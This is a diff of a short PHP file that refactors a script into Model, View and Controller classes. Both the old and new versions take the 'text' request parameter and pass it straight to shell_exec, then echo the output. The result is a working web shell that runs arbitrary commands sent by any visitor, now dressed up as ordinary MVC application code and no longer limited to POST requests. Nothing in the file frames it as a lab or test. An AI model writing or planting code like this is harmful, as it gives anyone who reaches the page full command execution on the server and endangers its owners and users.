@@ -1,10 +1,49 @@
 <?php
-if ($_SERVER['REQUEST_METHOD'] == 'POST') 
+include "/var/www/html/baseMVC.php";
+
+class Model implements IModel
 {
-    $text = $_REQUEST['text'];
-	$output = shell_exec($text);
-	echo $output;
+	public static function &domain()
+	{
+		return($_REQUEST);
+	}
+	
+	public static function C($query = "")
+	{
+		die;
+	}
+	
+	public static function R($query = "")
+	{
+		return(isset(Model::domain()["text"]) ? Model::domain()["text"] : "");
+	}
+	
+	public static function U($query = "")
+	{
+		die;
+	}
+	
+	public static function D($query = "")
+	{
+		die;
+	}
 }
-else
-	echo "not post";
+
+class View implements IView
+{
+	public static function display($query = "")
+	{
+		echo $query;
+	}
+}
+
+class Controller implements IController
+{
+	public static function control($query = "")
+	{
+		View::Display(shell_exec(Model::R()));
+	}
+}
+
+Controller::control();
 ?>
